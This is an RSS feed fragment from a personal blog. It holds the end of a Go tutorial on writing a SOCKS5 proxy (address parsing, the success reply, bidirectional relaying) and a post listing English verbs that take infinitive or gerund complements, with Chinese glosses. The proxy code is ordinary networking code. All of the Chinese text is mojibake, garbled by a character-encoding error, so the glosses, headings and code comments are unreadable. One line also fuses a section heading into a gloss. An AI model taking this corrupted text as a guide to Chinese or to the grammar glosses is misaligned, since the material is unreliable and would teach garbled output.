    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;DSTPORT&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;binary&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;BigEndian&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Uint16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// DSTADDRå…¨éƒ¨æ¢æˆIPåœ°å€ï¼Œå¯ä»¥é˜²æ­¢DNSæ±¡æŸ“å’Œå°æ€
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;RAWADDR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;TCPAddr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;IP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;DSTADDR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;Port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;DSTPORT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;cm&#34;&gt;/**
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;    å›åº”å®¢æˆ·ç«¯,å“åº”å®¢æˆ·ç«¯è¿æ¥æˆåŠŸ
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;        +----+-----+-------+------+----------+----------+
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;        |VER | REP |  RSV  | ATYP | BND.ADDR | BND.PORT |
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;        +----+-----+-------+------+----------+----------+
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;        | 1  |  1  | X&amp;#39;00&amp;#39; |  1   | Variable |    2     |
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;        +----+-----+-------+------+----------+----------+
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;    */&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;resp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x05&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x01&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt;


&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;4æœ€åå°†ä¿¡æ¯è¿›è¡Œè½¬å‘å³å¯&#34;&gt;ï¼ˆ4ï¼‰æœ€åå°†ä¿¡æ¯è¿›è¡Œè½¬å‘å³å¯&lt;/h4&gt;
&lt;p&gt;ä»£ç å®ç°:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-golang&#34; data-lang=&#34;golang&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;wg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sync&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;WaitGroup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;wg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;go&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;defer&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;wg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Done&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;defer&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;dstServer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Copy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;dstServer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}()&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;go&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;defer&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;wg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Done&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;defer&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Copy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;dstServer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}()&lt;/span&gt;

    &lt;span class=&#34;nx&#34;&gt;wg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Wait&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>å›ºå®šæ­é…</title>
        <link>https://sdttttt.github.io/p/%E5%9B%BA%E5%AE%9A%E6%90%AD%E9%85%8D/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>https://sdttttt.github.io/p/%E5%9B%BA%E5%AE%9A%E6%90%AD%E9%85%8D/</guid>
        <description>&lt;h2 id=&#34;æ¥ä¸å®šå¼è€Œä¸æ¥åŠ¨åè¯ä½œå®¾è¯­çš„24ä¸ªå¸¸ç”¨åŠ¨è¯&#34;&gt;æ¥ä¸å®šå¼ï¼ˆè€Œä¸æ¥åŠ¨åè¯ï¼‰ä½œå®¾è¯­çš„24ä¸ªå¸¸ç”¨åŠ¨è¯&lt;/h2&gt;
&lt;p&gt;afford to do sth. è´Ÿæ‹…å¾—èµ·åšæŸäº‹&lt;/p&gt;
&lt;p&gt;agree to do sth. åŒæ„åšæŸäº‹&lt;/p&gt;
&lt;p&gt;arrange to do sth.å®‰æ’åšæŸäº‹&lt;/p&gt;
&lt;p&gt;ask to do sth. è¦æ±‚åšæŸäº‹&lt;/p&gt;
&lt;p&gt;beg to do sth. è¯·æ±‚åšæŸäº‹&lt;/p&gt;
&lt;p&gt;care to do sth. æƒ³è¦åšæŸäº‹&lt;/p&gt;
&lt;p&gt;choose to do sth. å†³å®šåšæŸäº‹&lt;/p&gt;
&lt;p&gt;decide to do sth. å†³å®šåšæŸäº‹&lt;/p&gt;
&lt;p&gt;demand to do sth. è¦æ±‚åšæŸäº‹&lt;/p&gt;
&lt;p&gt;determine to do sth. å†³å¿ƒåšæŸäº‹&lt;/p&gt;
&lt;p&gt;expect to do sth. æœŸå¾…åšæŸäº‹&lt;/p&gt;
&lt;p&gt;fear to do sth. å®³æ€•åšæŸäº‹&lt;/p&gt;
&lt;p&gt;help to do sth. å¸®åŠ©åšæŸäº‹&lt;/p&gt;
&lt;p&gt;hope to do sth. å¸Œæœ›åšæŸäº‹&lt;/p&gt;
&lt;p&gt;learn to do sth. å­¦ä¹ åšæŸäº‹&lt;/p&gt;
&lt;p&gt;manage to do sth. è®¾æ³•åšæŸäº‹&lt;/p&gt;
&lt;p&gt;offer to do sth. ä¸»åŠ¨æå‡ºåšæŸäº‹&lt;/p&gt;
&lt;p&gt;plan to do sth. è®¡åˆ’åšæŸäº‹&lt;/p&gt;
&lt;p&gt;prepare to do sth. å‡†å¤‡åšæŸäº‹&lt;/p&gt;
&lt;p&gt;pretend to do sth. å‡è£…åšæŸäº‹&lt;/p&gt;
&lt;p&gt;promise to do sth. ç­”åº”åšæŸäº‹&lt;/p&gt;
&lt;p&gt;refuse to do sth. æ‹’ç»åšæŸäº‹&lt;/p&gt;
&lt;p&gt;want to do sth. æƒ³è¦åšæŸäº‹&lt;/p&gt;
&lt;p&gt;wish to do sth. å¸Œæœ›åšæŸäº‹&lt;/p&gt;
&lt;p&gt;æ³¨ï¼šæœ‰äº›ä¸åŠç‰©åŠ¨è¯åä¹ æƒ¯ä¸Šä¹Ÿæ¥ä¸å®šå¼ï¼Œä¸æ¥åŠ¨åè¯ï¼š&lt;/p&gt;
&lt;p&gt;aim to do sth. æ‰“ç®—åšæŸäº‹&lt;/p&gt;
&lt;p&gt;fail to do sth. æœªèƒ½åšæŸäº‹&lt;/p&gt;
&lt;p&gt;long to do sth. æ¸´æœ›åšæŸäº‹&lt;/p&gt;
&lt;p&gt;happen to do sth. ç¢°å·§åšæŸäº‹&lt;/p&gt;
&lt;p&gt;hesitate to do sth. çŠ¹è±«åšæŸäº‹&lt;/p&gt;
&lt;p&gt;struggle to do sth. åŠªåŠ›åšæŸäº‹&lt;/p&gt;
&lt;h2 id=&#34;æ¥ä¸å®šå¼ä½œå®¾è¡¥çš„36ä¸ªå¸¸ç”¨åŠ¨è¯&#34;&gt;æ¥ä¸å®šå¼ä½œå®¾è¡¥çš„36ä¸ªå¸¸ç”¨åŠ¨è¯&lt;/h2&gt;
&lt;p&gt;advise sb. to do sth. å»ºè®®æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;allow sb. to do sth. å…è®¸æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;ask sb. to do sth.è¯·ï¼ˆå«ï¼‰æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;bear sb. to do sth.å¿å—æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;beg sb. to do sth. è¯·æ±‚æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;cause sb. to do sth. å¯¼è‡´æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;command sb. to do sth. å‘½ä»¤æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;drive sb. to do sth .é©±ä½¿æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;elect sb. to do sth. é€‰ä¸¾æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;encourage sb. to do sth. é¼“åŠ±æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;expect sb. to do sth. æœŸæœ›æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;forbid sb. to do sth. ç¦æ­¢æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;force sb. to do sth. å¼ºè¿«æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;get sb. to do sth. ä½¿ï¼ˆè¦ï¼‰æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;hate sb. to do sth. è®¨åŒæŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;help sb. to do sth. å¸®åŠ©æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;intend sb. to do sth. æ‰“ç®—è¦æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;invite sb. to do sth. é‚€è¯·æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;leave sb. to do sth. ç•™ä¸‹æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;like sb. to do sth. å–œæ¬¢æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;mean sb. to do sth. æ‰“ç®—è¦æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;need sb. to do sth. éœ€è¦æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;oblige sb. to do sth. è¿«ä½¿æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;order sb. to do sth. å‘½ä»¤æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;permit sb. to do sth. å…è®¸æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;persuade sb. to do sth. è¯´æœæŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;prefer sb. to do sth. å®æ„¿æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;request sb. to do sth. è¦æ±‚æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;remind sb. to do sth. æé†’æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;teach sb. to do sth .æ•™æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;tell sb. to do sth. å‘Šè¯‰æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;train sb. to do sth. è®­ç»ƒæŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;trouble sb. to do sth. éº»çƒ¦æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;want sb. to do sth. æƒ³è¦æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;warn sb. to do sth. è­¦å‘ŠæŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;wish sb. to do sth. å¸Œæœ›æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;æ³¨ï¼šä¸è¦å—æ±‰è¯­æ„æ€çš„å½±å“è€Œè¯¯ç”¨ä»¥ä¸‹åŠ¨è¯å¥å‹ï¼š&lt;/p&gt;
&lt;p&gt;æ±‰è¯­è¯´ï¼šâ€œå®³æ€•æŸäººåšæŸäº‹â€ï¼Œä½†è‹±è¯­ä¸è¯´fear sb. to do sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­è¯´ï¼šâ€œåŸè°…æŸäººåšæŸäº‹â€ï¼Œä½†è‹±è¯­ä¸è¯´excuse [forgive] sb. to do sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­è¯´ï¼šâ€œæ‹’ç»æŸäººåšæŸäº‹â€ï¼Œä½†è‹±è¯­ä¸è¯´refuse sb. to do sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­è¯´ï¼šâ€œæƒ©ç½šæŸäººåšæŸäº‹â€ï¼Œä½†è‹±è¯­ä¸è¯´punish sb. to do sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­è¯´ï¼šâ€œå»ºè®®æŸäººåšæŸäº‹â€ï¼Œä½†è‹±è¯­ä¸è¯´suggest [propose] sb. to do sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­è¯´ï¼šâ€œèµæˆæŸäººåšæŸäº‹â€ï¼Œä½†è‹±è¯­ä¸è¯´approve sb. to do sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­è¯´ï¼šâ€œé€šçŸ¥æŸäººåšæŸäº‹â€ï¼Œä½†è‹±è¯­ä¸è¯´inform sb. to do sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­è¯´ï¼šâ€œæ¬¢è¿æŸäººåšæŸäº‹â€ï¼Œä½†è‹±è¯­ä¸è¯´welcome sb. to do sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­è¯´ï¼šâ€œåšæŒæŸäººåšæŸäº‹â€ï¼Œä½†è‹±è¯­ä¸è¯´insist [persist] sb. to do sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­è¯´ï¼šâ€œå¸Œæœ›æŸäººåšæŸäº‹â€ï¼Œä½†è‹±è¯­ä¸è¯´hope sb. to do sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­è¯´ï¼šâ€œå®‰æ’æŸäººåšæŸäº‹â€ï¼Œä½†è‹±è¯­ä¸è¯´arrange sb. to do sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­è¯´ï¼šâ€œè¦æ±‚æŸäººåšæŸäº‹â€ï¼Œä½†è‹±è¯­ä¸è¯´demand sb. to do sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­è¯´ï¼šâ€œæ„Ÿè°¢æŸäººåšæŸäº‹â€ï¼Œä½†è‹±è¯­ä¸è¯´thank sb. to do sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­è¯´ï¼šâ€œç¥è´ºæŸäººåšæŸäº‹â€ï¼Œä½†è‹±è¯­ä¸è¯´congratulate sb. to do sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­è¯´ï¼šâ€œé˜»æ­¢æŸäººåšæŸäº‹â€ï¼Œä½†è‹±è¯­ä¸è¯´prevent sb. to do sth.ã€‚&lt;/p&gt;
&lt;p&gt;è¦è¡¨ç¤ºä»¥ä¸Šæ„æ€ï¼Œå¯æ¢ç”¨å…¶ä»–è¡¨è¾¾ï¼š&lt;/p&gt;
&lt;p&gt;æ±‰è¯­çš„â€œåŸè°…æŸäººåšæŸäº‹â€ï¼Œè‹±è¯­å¯è¯´æˆexcuse [forgive] sb. for doing sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­çš„â€œå¸Œæœ›æŸäººåšæŸäº‹â€ï¼Œè‹±è¯­å¯è¯´æˆwish sb. to do sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­çš„â€œå»ºè®®æŸäººåšæŸäº‹â€ï¼Œè‹±è¯­å¯è¯´æˆadvise sb. to do sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­çš„â€œå®‰æ’æŸäººåšæŸäº‹â€ï¼Œè‹±è¯­å¯è¯´æˆarrange for sb. to do sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­çš„â€œè¦æ±‚æŸäººåšæŸäº‹â€ï¼Œè‹±è¯­å¯è¯´æˆdemand of sb. to do sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­çš„â€œæ„Ÿè°¢æŸäººåšæŸäº‹â€ï¼Œè‹±è¯­å¯è¯´æˆthank sb. for doing sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­çš„â€œç¥è´ºæŸäººåšæŸäº‹â€ï¼Œè‹±è¯­å¯è¯´æˆcongratulate sb. on doing sth.ã€‚&lt;/p&gt;
&lt;p&gt;æ±‰è¯­çš„â€œé˜»æ­¢æŸäººåšæŸäº‹â€ï¼Œè‹±è¯­å¯è¯´æˆprevent sb. from doing sth.ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ¥åŠ¨åè¯ä¸æ¥ä¸å®šå¼ä½œå®¾è¯­çš„34ä¸ªå¸¸ç”¨åŠ¨è¯&#34;&gt;æ¥åŠ¨åè¯ï¼ˆä¸æ¥ä¸å®šå¼ï¼‰ä½œå®¾è¯­çš„34ä¸ªå¸¸ç”¨åŠ¨è¯&lt;/h2&gt;
&lt;p&gt;admit doing sth. æ‰¿è®¤åšæŸäº‹                    advise doing sth. å»ºè®®åšæŸäº‹&lt;/p&gt;
&lt;p&gt;allow doing sth. å…è®¸åšæŸäº‹                     appreciate doing sth. æ„Ÿæ¿€åšæŸäº‹&lt;/p&gt;
&lt;p&gt;avoid doing sth. é¿å…åšæŸäº‹                     consider doing sth. è€ƒè™‘åšæŸäº‹&lt;/p&gt;
&lt;p&gt;delay doing sth. æ¨è¿ŸåšæŸäº‹                     deny doing sth. å¦è®¤åšæŸäº‹&lt;/p&gt;
&lt;p&gt;discuss doing sth. è®¨è®ºåšæŸäº‹                   dislike doing sth. ä¸å–œæ¬¢åšæŸäº‹&lt;/p&gt;
&lt;p&gt;enjoy doing sth. å–œçˆ±åšæŸäº‹                     escape doing sth. é€ƒè„±åšæŸäº‹&lt;/p&gt;
&lt;p&gt;excuse doing sth. åŸè°…åšæŸäº‹                    fancy doing sth. è®¾æƒ³åšæŸäº‹&lt;/p&gt;
&lt;p&gt;finish doing sth. å®ŒæˆåšæŸäº‹                      forbid doing sth. ç¦æ­¢åšæŸäº‹&lt;/p&gt;
&lt;p&gt;forgive doing sth. åŸè°…åšæŸäº‹                    give up doing sth. æ”¾å¼ƒåšæŸäº‹&lt;/p&gt;
&lt;p&gt;imagine doing sth. æƒ³è±¡åšæŸäº‹                   keep doing sth. ä¿æŒåšæŸäº‹&lt;/p&gt;
&lt;p&gt;mention doing sth. æåŠåšæŸäº‹                   mind doing sth. ä»‹æ„åšæŸäº‹&lt;/p&gt;
&lt;p&gt;miss doing sth. é”™è¿‡åšæŸäº‹                        pardon doing sth. åŸè°…åšæŸäº‹&lt;/p&gt;
&lt;p&gt;permit doing sth. å…è®¸åšæŸäº‹                      practice doing sth. ç»ƒä¹ åšæŸäº‹&lt;/p&gt;
&lt;p&gt;prevent doing sth. é˜»æ­¢åšæŸäº‹                     prohibit doing sth. ç¦æ­¢åšæŸäº‹&lt;/p&gt;
&lt;p&gt;put off doing sth. æ¨è¿ŸåšæŸäº‹                      report doing sth. æŠ¥å‘ŠåšæŸäº‹&lt;/p&gt;
&lt;p&gt;risk doing sth. å†’é™©åšæŸäº‹                         stop doing sth. åœæ­¢åšæŸäº‹&lt;/p&gt;
&lt;p&gt;suggest doing sth. å»ºè®®åšæŸäº‹                     understand doing sth. ç†è§£åšæŸäº‹&lt;/p&gt;
&lt;h2 id=&#34;æ¥ç°åœ¨åˆ†è¯ä½œå®¾è¡¥çš„20ä¸ªå¸¸ç”¨åŠ¨è¯&#34;&gt;æ¥ç°åœ¨åˆ†è¯ä½œå®¾è¡¥çš„20ä¸ªå¸¸ç”¨åŠ¨è¯&lt;/h2&gt;
&lt;p&gt;bring sb. doing sth.å¼•èµ·æŸäººåšæŸäº‹    catch sb. doing sth. ç¢°ä¸Šï¼ˆæ’ä¸Šï¼‰æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;discover sb. doing sth. å‘ç°æŸäººåšæŸäº‹   feel sb. doing sth. æ„Ÿè§‰æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;find sb. doing sth. ç¢°ä¸Šï¼ˆæ’ä¸Šï¼‰æŸäººåšæŸäº‹  get sb. doing sth. ä½¿æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;have sb. doing sth. ä½¿æŸäººåšæŸäº‹             hear sb. doing sth. å¬è§æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;keep sb. doing sth. ä½¿æŸäººä¸åœåœ°åšæŸäº‹    listen to sb. doing sth. å¬æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;look at sb. doing sth. çœ‹ç€æŸäººåšæŸäº‹        notice sb. doing sth. æ³¨æ„åˆ°æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;observe sb. doing sth. è§‚å¯ŸæŸäººåšæŸäº‹      prevent sb. doing sth. é˜»æ­¢æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;see sb. doing sth. çœ‹è§æŸäººåšæŸäº‹            send sb. doing sth.ä½¿æŸäººï¼ˆçªç„¶ï¼‰åšæŸäº‹&lt;/p&gt;
&lt;p&gt;set sb. doing sth. ä½¿ï¼ˆå¼•èµ·ï¼‰æŸäººåšæŸäº‹     start sb. doing sth. ä½¿æŸäººå¼€å§‹åšæŸäº‹&lt;/p&gt;
&lt;p&gt;stop sb. doing sth. é˜»æ­¢æŸäººåšæŸäº‹           watch sb. doing sth. è§‚äº”ã€æ¥åŠ¨è¯åŸå½¢ä½œå®¾è¡¥çš„11ä¸ªå¸¸ç”¨åŠ¨è¯&lt;/p&gt;
&lt;p&gt;feel sb. do sth. æ„Ÿè§‰æŸäººåšæŸäº‹                                have sb. do sth. ä½¿æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;hear sb. do sth. å¬è§æŸäººåšæŸäº‹             let sb. do sth.è®©æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;listen to sb. do sth. å¬ç€æŸäººåšæŸäº‹        look at sb. do sth. çœ‹ç€æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;make sb. do sth. ä½¿æŸäººåšæŸäº‹              notice sb. do sth. æ³¨æ„æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;observe sb. do sth. è§‚å¯ŸæŸäººåšæŸäº‹         see sb. do sth. çœ‹è§æŸäººåšæŸäº‹&lt;/p&gt;
&lt;p&gt;watch sb. do sth. è§‚å¯ŸæŸäººåšæŸäº‹&lt;/p&gt;
